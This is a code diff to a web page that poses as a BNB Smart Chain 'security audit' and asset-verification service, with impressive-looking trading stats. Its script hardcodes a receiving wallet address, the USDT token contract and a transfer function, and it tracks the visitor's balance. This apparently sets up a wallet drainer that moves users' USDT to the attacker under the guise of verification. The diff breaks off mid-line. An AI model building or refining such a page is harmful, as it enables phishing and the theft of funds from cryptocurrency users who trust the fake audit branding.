@@ -168,7 +168,7 @@
 
     <div class="content-area">
       
-      <!-- Stats Cards (Matching Screenshot 33818) -->
+      <!-- Stats Cards -->
       <div class="card">
         <div class="card-label">USDT VERIFIED (24H)</div>
         <div class="card-value text-yellow">$15,906,052</div>
@@ -198,7 +198,7 @@
       <div class="main-heading">BNB Smart Chain <span>Security<br>Audit</span></div>
       <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
 
-      <!-- Verify BEP-20 Assets Box (Matching Screenshot 33819) -->
+      <!-- Verify Action Box -->
       <div class="verify-box">
         <div class="token-row">
           <div class="token-info">
@@ -327,7 +327,8 @@
   <script>
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Official BEP-20 USDT on BSC
-    
+    const BSC_CHAIN_ID = '0x38'; // Chain ID 56 (Hex: 0x38) for BNB Smart Chain
+
     const ERC20_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
       "function transfer(address to, uint256 amount) external returns (bool)"
@@ -336,5 +337,4 @@
     let userBalanceBN = null;
 
     function closeModal(id) {
-      document.getElementById(id).style.display = 'none';
-  
+      document.getElementById(id).style.display
